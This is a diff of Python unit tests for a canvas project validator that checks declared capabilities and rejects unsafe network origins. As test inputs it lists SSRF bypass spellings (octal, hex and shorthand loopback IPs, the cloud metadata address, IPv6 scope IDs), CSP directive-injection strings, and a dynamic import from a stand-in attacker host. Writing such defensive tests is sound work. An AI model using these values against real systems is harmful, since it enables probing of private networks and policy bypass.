@@ -79,6 +79,39 @@ class TestCanvasSourceAdapter(SimpleTestCase):
                 "import_not_allowed",
             ),
             (
+                "undeclared_state_access",
+                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.set("k", 1);'}),
+                "capability_missing_state",
+            ),
+            (
+                # get/set default to the user scope, so declaring only shared
+                # does not cover a scopeless call.
+                "state_default_user_scope_undeclared",
+                project(
+                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.set("k", 1);'},
+                    capabilities={"posthog": {"state": ["shared"]}, "network": {"origins": []}},
+                ),
+                "capability_missing_state",
+            ),
+            (
+                "state_scope_literal_undeclared",
+                project(
+                    files={CANVAS_COMPONENT_PATH: CODE + 'ph.state.get("k", { scope: "shared" });'},
+                    capabilities={"posthog": {"state": ["user"]}, "network": {"origins": []}},
+                ),
+                "capability_missing_state",
+            ),
+            (
+                "undeclared_action_invoke",
+                project(files={CANVAS_COMPONENT_PATH: CODE + 'ph.actions.invoke("tasks.create", {});'}),
+                "capability_missing_action",
+            ),
+            (
+                "unregistered_declared_action",
+                project(capabilities={"posthog": {"actions": ["flags.delete"]}, "network": {"origins": []}}),
+                "action_not_registered",
+            ),
+            (
                 "dynamic_import",
                 project(files={CANVAS_COMPONENT_PATH: 'const m = await import("https://evil.dev/x.js");'}),
                 "forbidden_dynamic_import",
@@ -129,6 +162,26 @@ class TestCanvasSourceAdapter(SimpleTestCase):
         self.assertTrue(has_errors(diagnostics), diagnostics)
         self.assertIn(expected_code, [d["code"] for d in diagnostics])
 
+    @parameterized.expand(
+        [
+            # A scopeless get/set defaults to the user scope.
+            ("default_user_scope", 'ph.state.set("k", 1);', ["user"]),
+            ("explicit_scope_literal", 'ph.state.get("k", { scope: "shared" });', ["shared"]),
+            # A scopeless list reads whatever is declared, so any declaration covers it.
+            ("scopeless_list", "ph.state.list();", ["shared"]),
+        ]
+    )
+    def test_declared_state_scopes_silence_the_state_diagnostic(self, _name, snippet, scopes):
+        candidate = project(
+            files={CANVAS_COMPONENT_PATH: CODE + snippet},
+            capabilities={
+                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": [], "state": scopes},
+                "network": {"origins": []},
+            },
+        )
+        diagnostics = validate_source_project(candidate)
+        self.assertNotIn("capability_missing_state", [d["code"] for d in diagnostics])
+
     def test_direct_network_calls_warn_but_stay_publishable(self):
         # fetch() is blocked by the sandbox CSP, not by publish — a comment or
         # string mentioning it must not brick a canvas, so it's a warning.
@@ -137,8 +190,77 @@ class TestCanvasSourceAdapter(SimpleTestCase):
         self.assertFalse(has_errors(diagnostics))
         self.assertIn("network_fetch", [d["code"] for d in diagnostics])
 
+    @parameterized.expand(
+        [
+            ("http", "http://api.example.com"),
+            ("path", "https://api.example.com/v1"),
+            ("credentials", "https://user:secret@api.example.com"),
+            ("wildcard", "https://*.example.com"),
+            # Origins land in the viewer's connect-src, so private and local
+            # destinations would let a canvas probe the viewer's machine or LAN.
+            ("loopback_ipv4", "https://127.0.0.1:8443"),
+            ("private_ipv4", "https://192.168.1.1"),
+            ("cgnat_ipv4", "https://100.64.0.1"),
+            ("loopback_ipv6", "https://[::1]"),
+            ("localhost", "https://localhost:8010"),
+            ("single_label", "https://intranet"),
+            ("mdns_suffix", "https://printer.local"),
+            # Bypass spellings from the security review: browsers resolve these
+            # to loopback/LAN targets even though the strict IP parse rejects them.
+            ("trailing_dot_localhost", "https://localhost."),
+            ("trailing_dot_metadata", "https://169.254.169.254."),
+            ("trailing_dot_public", "https://api.example.com."),
+            ("ipv4_shorthand", "https://127.1"),
+            ("ipv4_octal", "https://0177.0.0.1"),
+            ("ipv4_leading_zero", "https://192.168.01.1"),
+            ("ipv4_hex_label", "https://1.2.3.0x10"),
+            ("ipv6_scope_id", "https://[fe80::1%eth0]"),
+            ("ipv6_global_scope_id", "https://[2606:4700:4700::1111%foo; img-src evil.example]"),
+            # A delimiter in the hostname would break out of the connect-src it is
+            # spliced into. This form carries no wildcard, so only the hostname
+            # charset check rejects it.
+            ("csp_directive_injection", "https://example.com; img-src evil.example.net"),
+        ]
+    )
+    def test_rejects_network_origins_that_are_not_exact_https_origins(self, _name, origin):
+        candidate = project(
+            capabilities={
+                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": []},
+                "network": {"origins": [origin]},
+            }
+        )
+        diagnostics = validate_source_project(candidate)
+        self.assertIn("invalid_network_origin", [d["code"] for d in diagnostics])
+
+    def test_accepts_exact_https_network_origin(self):
+        candidate = project(
+            capabilities={
+                "posthog": {"insights": [], "inlineQueries": False, "captureEvents": []},
+                "network": {"origins": ["https://api.example.com:8443"]},
+            }
+        )
+        self.assertFalse(has_errors(validate_source_project(candidate)))
+
     def test_import_diagnostics_carry_file_and_line(self):
         candidate = project(files={CANVAS_COMPONENT_PATH: CODE + 'import _ from "lodash";'})
         entry = next(d for d in validate_source_project(candidate) if d["code"] == "import_not_allowed")
         self.assertEqual(entry["path"], CANVAS_COMPONENT_PATH)
         self.assertEqual(entry["line"], 3)
+
+    def test_agent_request_requires_declared_capability(self):
+        candidate = project(
+            files={CANVAS_COMPONENT_PATH: CODE + 'ph.agent.request("Make it blue");'},
+            capabilities={
+                "posthog": {
+                    "insights": [],
+                    "inlineQueries": False,
+                    "captureEvents": [],
+                    "agentRequests": False,
+                },
+                "network": {"origins": []},
+            },
+        )
+
+        diagnostics = validate_source_project(candidate)
+
+        self.assertIn("capability_missing_agent_requests", [entry["code"] for entry in diagnostics])
